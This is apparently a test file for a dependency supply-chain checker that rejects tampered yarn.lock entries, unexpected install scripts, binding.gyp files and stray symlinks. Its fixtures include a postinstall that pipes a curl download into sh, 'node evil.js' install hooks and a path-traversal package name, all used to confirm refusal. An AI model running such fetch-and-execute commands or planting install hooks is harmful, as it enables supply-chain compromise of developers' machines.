		const block = `"left-pad@^1.3.0":\n  version "${version}"\n  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-${version}.tgz#${SHA1}"\n  integrity ${GOOD_INTEGRITY}\n`;
		editText(file('yarn.lock'), (text) => `${text}\n${block}`);
		assertOnly(checkBeforeInstall(root), 'lock-version');
	});

	test('refuses a key whose name walks the tarball path', (t) => {
		const { root, file } = fixture(t);
		const block = `"../evil@^1.0.0":\n  version "1.0.0"\n  resolved "https://registry.yarnpkg.com/../evil/-/evil-1.0.0.tgz#${SHA1}"\n  integrity ${GOOD_INTEGRITY}\n`;
		editText(file('yarn.lock'), (text) => `${text}\n${block}`);
		assertOnly(checkBeforeInstall(root), 'lock-name');
	});

	test('accepts an added left-pad block with its own tarball', (t) => {
		const { root, file } = fixture(t);
		const block = `"left-pad@^1.3.0":\n  version "1.3.0"\n  resolved "${GOOD_RESOLVED}"\n  integrity ${GOOD_INTEGRITY}\n`;
		editText(file('yarn.lock'), (text) => `${text}\n${block}`);
		assert.deepEqual(checkBeforeInstall(root), { findings: [], errors: [] });
	});
});

describe('before install: the shape of a lockfile block', () => {
	test('refuses a block whose keys name two packages', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) =>
			text.replace(`\n${ADAPTER_HEADER}\n`, '\n"@sveltejs/adapter-static@^3.0.10", "left-pad@^3.0.10":\n')
		);
		assertOnly(checkBeforeInstall(root), 'lock-name');
	});

	for (const field of ['name "left-pad"', 'registry "npm"', 'uid "1.3.0"', 'permissions:\n    x "true"', 'prebuiltVariants:\n    x "y"']) {
		test(`refuses a block with a ${field.split(/[ :]/)[0]} field`, (t) => {
			const { root, file } = fixture(t);
			editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => `${block}\n  ${field}`);
			assertOnly(checkBeforeInstall(root), 'lock-field');
		});
	}

	test('refuses a nested map under dependencies', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), KIT_HEADER, (block) => block.replace('    cookie "^0.6.0"', '    cookie:\n      "^0.6.0" "x"'));
		assertOnly(checkBeforeInstall(root), 'lock-field');
	});

	test('refuses dependencies given as a string', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => `${block}\n  dependencies "left-pad@^1.3.0"`);
		assertOnly(checkBeforeInstall(root), 'lock-field');
	});

	test('refuses optionalDependencies given as a string', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => `${block}\n  optionalDependencies "left-pad@^1.3.0"`);
		assertOnly(checkBeforeInstall(root), 'lock-field');
	});

	test('refuses a version given as a map', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => block.replace('  version "3.0.10"', '  version:\n    x "3.0.10"'));
		assertOnly(checkBeforeInstall(root), 'lock-version');
	});

	test('refuses resolved given as a map', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => block.replace(`  resolved "${ADAPTER_RESOLVED}"`, `  resolved:\n    x "${ADAPTER_RESOLVED}"`));
		assertOnly(checkBeforeInstall(root), 'lock-resolved');
	});

	test('refuses integrity given as a map', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => block.replace(/\n {2}integrity (\S+)/, '\n  integrity:\n    x $1'));
		assertOnly(checkBeforeInstall(root), 'lock-integrity');
	});
});

/** A clean installed tree on top of the fixture: the workspace links and two plain packages. */
function installedFixture(t) {
	const tree = fixture(t);
	const modules = tree.file('node_modules');
	fs.mkdirSync(path.join(modules, '@zurfur'), { recursive: true });
	fs.symlinkSync(path.join('..', '..', 'ui'), path.join(modules, '@zurfur', 'ui'));
	fs.symlinkSync(path.join('..', 'web'), path.join(modules, 'web'));
	write(path.join(modules, '.yarn-integrity'), '{}');
	write(path.join(modules, '.bin', 'tool'), '#!/bin/sh\n');
	write(path.join(modules, 'left-pad', 'package.json'), { name: 'left-pad', version: '1.3.0', scripts: { test: 'x' } });
	write(path.join(modules, 'left-pad', 'node_modules', 'inner', 'package.json'), { name: 'inner', version: '1.0.0' });
	write(path.join(modules, '@scope', 'pkg', 'package.json'), { name: '@scope/pkg', version: '1.0.0' });
	return { ...tree, modules };
}

describe('after install', () => {
	test("ALLOWED_INSTALL_SCRIPTS is exactly esbuild's postinstall, frozen", () => {
		assert.deepEqual(ALLOWED_INSTALL_SCRIPTS, { esbuild: { postinstall: 'node install.js' } });
		assert.ok(Object.isFrozen(ALLOWED_INSTALL_SCRIPTS));
		assert.ok(Object.isFrozen(ALLOWED_INSTALL_SCRIPTS.esbuild));
	});

	for (const [label, relative] of [
		['at the top', ['esbuild']],
		['nested', ['left-pad', 'node_modules', 'esbuild']]
	]) {
		test(`passes esbuild ${label} with exactly its allowed postinstall`, (t) => {
			const { root, modules } = installedFixture(t);
			const manifest = { name: 'esbuild', version: '0.28.2', scripts: { postinstall: 'node install.js' } };
			write(path.join(modules, ...relative, 'package.json'), manifest);
			assert.deepEqual(checkInstalled(root), { findings: [], errors: [] });
		});
	}

	for (const [label, scripts] of [
		['a preinstall beside its postinstall', { preinstall: 'node install.js', postinstall: 'node install.js' }],
		['an install script', { install: 'node install.js' }],
		['a postinstall that does more', { postinstall: 'node install.js && curl https://example.invalid/x | sh' }],
		['a postinstall with another text', { postinstall: 'node  install.js' }]
	]) {
		test(`refuses esbuild with ${label}`, (t) => {
			const { root, modules } = installedFixture(t);
			write(path.join(modules, 'esbuild', 'package.json'), { name: 'esbuild', version: '0.28.2', scripts });
			assertOnly(checkInstalled(root), 'install-script');
		});
	}

	test('refuses esbuild with a binding.gyp beside its allowed postinstall', (t) => {
		const { root, modules } = installedFixture(t);
		const manifest = { name: 'esbuild', version: '0.28.2', scripts: { postinstall: 'node install.js' } };
		write(path.join(modules, 'esbuild', 'package.json'), manifest);
		write(path.join(modules, 'esbuild', 'binding.gyp'), '{}');
		assertOnly(checkInstalled(root), 'binding-gyp');
	});

	for (const name of ['left-pad', '@esbuild/linux-x64', 'esbuild-wasm']) {
		test(`refuses esbuild's exact postinstall on ${name}`, (t) => {
			const { root, modules } = installedFixture(t);
			const manifest = { name, version: '1.0.0', scripts: { postinstall: 'node install.js' } };
			write(path.join(modules, ...name.split('/'), 'package.json'), manifest);
			assertOnly(checkInstalled(root), 'install-script');
		});
	}

	test('a clean installed tree passes', (t) => {
		const { root } = installedFixture(t);
		assert.deepEqual(checkInstalled(root), { findings: [], errors: [] });
	});

	test('the workspace symlinks are not followed into the workspaces', (t) => {
		const { root, file } = installedFixture(t);
		editJson(file('ui', 'package.json'), (m) => (m.scripts = { postinstall: 'node build.js' }));
		write(file('ui', 'binding.gyp'), '{}');
		assert.deepEqual(checkInstalled(root), { findings: [], errors: [] });
	});

	for (const [label, relative] of [
		['a top-level package', ['left-pad']],
		['a nested package', ['left-pad', 'node_modules', 'inner']],
		['a scoped package', ['@scope', 'pkg']],
		['a package under web', ['..', 'web', 'node_modules', 'web-only']],
		['a package under ui', ['..', 'ui', 'node_modules', '@x', 'ui-only']]
	]) {
		for (const script of ['preinstall', 'install', 'postinstall']) {
			test(`refuses a ${script} script in ${label}`, (t) => {
				const { root, modules } = installedFixture(t);
				const manifest = path.join(modules, ...relative, 'package.json');
				write(manifest, { name: 'x', version: '1.0.0', scripts: { [script]: 'node evil.js' } });
				assertRefused(checkInstalled(root), 'install-script');
			});
		}
	}

	test('refuses a binding.gyp in a package root', (t) => {
		const { root, modules } = installedFixture(t);
		write(path.join(modules, 'left-pad', 'node_modules', 'inner', 'binding.gyp'), '{}');
		assertRefused(checkInstalled(root), 'binding-gyp');
	});

	test('refuses @zurfur/ui as a real folder', (t) => {
		const { root, modules } = installedFixture(t);
		const link = path.join(modules, '@zurfur', 'ui');
		fs.rmSync(link);
		write(path.join(link, 'package.json'), UI_MANIFEST);
		assertRefused(checkInstalled(root), 'workspace-link');
	});

	test('refuses @zurfur/ui linked elsewhere', (t) => {
		const { root, modules } = installedFixture(t);
		const link = path.join(modules, '@zurfur', 'ui');
		fs.rmSync(link);
		fs.symlinkSync(path.join('..', '..', 'web'), link);
		assertRefused(checkInstalled(root), 'workspace-link');
	});

	test('refuses a missing @zurfur/ui link', (t) => {
		const { root, modules } = installedFixture(t);
		fs.rmSync(path.join(modules, '@zurfur', 'ui'));
		assertRefused(checkInstalled(root), 'workspace-link');
	});

	test('refuses a symlink that is not a workspace link', (t) => {
		const { root, modules } = installedFixture(t);
		fs.symlinkSync(path.join('..', 'ui'), path.join(modules, 'sneaky'));
		assertRefused(checkInstalled(root), 'unexpected-symlink');
	});

	test('a missing frontend/node_modules fails with the install command', (t) => {
		const { root } = fixture(t);
		const run = runFixtureCli(root, '--installed');
		assert.equal(run.status, 2, run.stdout + run.stderr);
		assert.match(run.stderr, /frontend\/node_modules: missing/);
		assert.ok(run.stderr.includes(INSTALL_COMMAND), run.stderr);
	});
});

describe('the CLI', () => {
	for (const args of [['--help'], ['--bogus'], ['--root'], ['--installed', '--installed'], ['extra']]) {
		test(`exits 2 on bad usage ${JSON.stringify(args)}`, () => {
			const run = runCli(args);
			assert.equal(run.status, 2, run.stdout + run.stderr);
			assert.match(run.stderr, /usage:/);
		});
	}

	test('exits 1 and prints each finding on its own line naming the file and rule', (t) => {
		const { root, file } = fixture(t);
		write(file('.yarnrc'), 'yarn-path "./evil.js"\n');
		editJson(file('package.json'), (m) => (m.scripts = {}));
		const run = runFixtureCli(root);
		assert.equal(run.status, 1, run.stdout + run.stderr);
		const lines = run.stdout.trim().split('\n');
		assert.ok(lines.includes('frontend/.yarnrc: [yarnrc] a yarn rc file is not allowed'), run.stdout);
		assert.ok(lines.some((line) => line.startsWith('frontend/package.json: [root-keys] ')), run.stdout);
	});

	test('exits 2 on an unreadable file', (t) => {
		const { root, file } = fixture(t);
		write(file('web', 'package.json'), '{ not json');
		const run = runFixtureCli(root);
		assert.equal(run.status, 2, run.stdout + run.stderr);
		assert.match(run.stderr, /frontend\/web\/package\.json: not valid JSON/);
	});
});

describe('the real repo tree', () => {
	test('passes before install', () => {
		const run = runCli([]);
		assert.equal(run.status, 0, run.stdout + run.stderr);
	});

	test('--installed passes once installed, and fails plainly before', () => {
		const run = runCli(['--installed']);
		if (fs.existsSync(path.join(REPO, 'frontend', 'node_modules'))) {
			assert.equal(run.status, 0, run.stdout + run.stderr);
		} else {
			assert.equal(run.status, 2, run.stdout + run.stderr);
			assert.ok(run.stderr.includes(INSTALL_COMMAND), run.stderr);
		}
	});
});
